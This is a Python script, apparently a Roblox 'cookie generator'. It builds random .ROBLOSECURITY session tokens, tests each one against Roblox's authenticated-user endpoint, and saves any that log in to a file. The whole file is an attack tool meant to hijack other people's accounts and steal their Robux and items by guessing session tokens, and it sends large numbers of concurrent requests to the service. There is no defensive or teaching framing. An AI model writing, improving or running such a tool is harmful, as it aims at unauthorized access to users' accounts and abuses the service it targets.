import subprocess
try:
    import string
    import random
    import asyncio
    from aiohttp import ClientSession
    from aiofiles import open as aioopen
    import sys
except:
    subprocess.call("pip install aiofiles", shell=True)
    subprocess.call("pip install aiohttp", shell=True)
    subprocess.call("pip install asyncio", shell=True)
    import string
    import random
    import asyncio
    from aiohttp import ClientSession
    from aiofiles import open as aioopen
    import sys



cookies = []
invalid_cookies = []
intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
n = 0
v = input("What is your desired amount of cookies (higher cookies generated will increase odds of generating valid cookies.")
c = int(v)
letters = 'ABCDEF'
print("""______                _              _   _   _           
| ___ \              | |            | | | | | |          
| |_/ /  ___    ___  | |_   ___   __| | | | | | _ __     
| ___ \ / _ \  / _ \ | __| / _ \ / _` | | | | || '_ \    
| |_/ /| (_) || (_) || |_ |  __/| (_| | | |_| || |_) | _ 
\____/  \___/  \___/  \__| \___| \__,_|  \___/ | .__/ (_)
                                               | |       
                                               |_| """)

invalid_count = 0

async def generate_cookie():
    global invalid_count
    cookie =  intro +  ''.join(random.choices(letters + string.digits, k=732))
    async with ClientSession() as session:
        async with session.get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie}) as response:
            text = await response.text()
            if '"id":' in text:
                print(cookie)
                cookies.append(cookie)
                await write_cookies()
                sys.exit()
            else:
                invalid_count += 1
                invalid_cookies.append(cookie)
                print("\rInvalid cookies: {}".format(invalid_count), end="")

async def write_cookies():
    async with aioopen("cookies.txt", "w") as n:
        for i in cookies:
            var = f"{i}"
            await n.write(var)
            await n.write(" ")
    async with aioopen("invalid_cookies.txt", "w") as r:
        for i in invalid_cookies:
            var = f"{i}"
            await r.write(var)
            await r.write(" ")

async def main():
    global invalid_count
    while True:
        tasks = [asyncio.create_task(generate_cookie()) for i in range(c)]
        await asyncio.gather(*tasks)
        await write_cookies()
        if invalid_count == c:
            print("\nNone of the cookies were valid, retrying in 3 seconds")
            await asyncio.sleep(3)
            invalid_count = 0
        else:
            print('\n[!] Done!')
            break

asyncio.run(main())
input("\nPress enter to exit.\n")
